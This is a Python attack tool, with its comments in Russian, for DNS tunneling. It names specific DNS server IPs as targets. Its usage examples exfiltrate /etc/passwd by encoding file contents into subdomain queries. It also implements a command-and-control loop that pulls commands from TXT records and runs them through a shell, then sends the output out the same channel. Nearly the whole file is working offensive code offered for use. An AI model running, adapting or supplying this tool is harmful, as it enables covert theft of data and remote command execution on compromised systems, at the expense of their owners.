#!/usr/bin/env python3
"""
DNS Tunneling Tool
Вектор атаки: DNS Tunneling
Цель: DNS серверы (78.37.77.77, 212.48.197.77)
Вероятность успеха: СРЕДНЯЯ
Уровень сложности: СРЕДНИЙ

Описание:
Инструмент для экзфильтрации данных через DNS запросы и C2 коммуникации.
Кодирование данных в subdomain names и использование TXT records.

Использование:
python3 dns_tunneling.py --mode exfiltrate --domain tunnel.example.com --file /etc/passwd
python3 dns_tunneling.py --mode c2 --domain tunnel.example.com --dns-server 78.37.77.77

Зависимости:
pip install scapy dnspython

Автор: Auto-exploit framework
Дата: 2026-07-30
"""

import dns.resolver
import base64
import time
import argparse
import subprocess
import os

class DNSTunnelClient:
    def __init__(self, domain, dns_server="78.37.77.77"):
        self.domain = domain
        self.dns_server = dns_server
        self.chunk_size = 63  # Максимальная длина label
    
    def encode_data(self, data):
        """Кодирование данных для DNS tunneling"""
        return base64.b32encode(data).decode('ascii')
    
    def chunk_data(self, encoded_data):
        """Разбивка данных на chunks"""
        chunks = []
        for i in range(0, len(encoded_data), self.chunk_size):
            chunk = encoded_data[i:i + self.chunk_size]
            chunks.append(chunk)
        return chunks
    
    def send_chunk(self, chunk):
        """Отправка chunk через DNS"""
        subdomain = f"{chunk}.{self.domain}"
        
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            answer = resolver.resolve(subdomain, 'A')
            return True
            
        except Exception as e:
            return False
    
    def exfiltrate(self, data):
        """Экзфильтрация данных через DNS"""
        print(f"[*] Экзфильтрация {len(data)} bytes...")
        
        encoded_data = self.encode_data(data)
        chunks = self.chunk_data(encoded_data)
        
        print(f"[+] Разбито на {len(chunks)} chunks")
        
        for i, chunk in enumerate(chunks):
            if self.send_chunk(chunk):
                if i % 10 == 0:
                    print(f"[+] Отправлено {i+1}/{len(chunks)} chunks")
                time.sleep(0.1)
            else:
                print(f"[-] Ошибка отправки chunk {i+1}")
                return False
        
        print("[+] Экзфильтрация завершена")
        return True
    
    def exfiltrate_file(self, file_path):
        """Экзфильтрация файла через DNS"""
        print(f"[*] Эксфильтрация файла: {file_path}")
        
        if not os.path.exists(file_path):
            print(f"[-] Файл не существует: {file_path}")
            return False
        
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Сжатие данных
        import zlib
        compressed_data = zlib.compress(data)
        
        # Экзфильтрация
        return self.exfiltrate(compressed_data)
    
    def receive_command(self):
        """Получение команд через DNS TXT records"""
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            answer = resolver.resolve(f"cmd.{self.domain}", 'TXT')
            
            for txt_record in answer:
                command = str(txt_record).strip('"')
                print(f"[+] Получена команда: {command}")
                return command
                
        except Exception as e:
            return None
    
    def c2_communication(self):
        """C2 коммуникация через DNS"""
        print("[*] Запуск C2 коммуникации...")
        
        while True:
            try:
                command = self.receive_command()
                
                if command == "exit":
                    print("[+] Получена команда exit")
                    return
                
                if command:
                    # Выполнение команды
                    result = subprocess.run(command, shell=True, 
                                          capture_output=True, text=True)
                    
                    # Отправка результата
                    self.exfiltrate(result.stdout.encode())
                    self.exfiltrate(result.stderr.encode())
                
                time.sleep(5)
                
            except KeyboardInterrupt:
                print("[*] Остановка C2")
                break
            except Exception as e:
                print(f"[-] Ошибка C2: {e}")
                time.sleep(10)

def main():
    parser = argparse.ArgumentParser(description='DNS Tunneling Tool')
    parser.add_argument('--mode', choices=['exfiltrate', 'c2', 'file'], required=True, help='Operation mode')
    parser.add_argument('--domain', required=True, help='Tunnel domain')
    parser.add_argument('--dns-server', default='78.37.77.77', help='DNS server')
    parser.add_argument('--data', help='Data to exfiltrate')
    parser.add_argument('--file', help='File to exfiltrate')
    
    args = parser.parse_args()
    
    print(f"[*] DNS Tunneling Tool")
    print(f"[*] Mode: {args.mode}")
    print(f"[*] Domain: {args.domain}")
    print(f"[*] DNS Server: {args.dns_server}")
    
    client = DNSTunnelClient(args.domain, args.dns_server)
    
    if args.mode == 'exfiltrate' and args.data:
        client.exfiltrate(args.data.encode())
    elif args.mode == 'file' and args.file:
        client.exfiltrate_file(args.file)
    elif args.mode == 'c2':
        client.c2_communication()

if __name__ == "__main__":
    main()
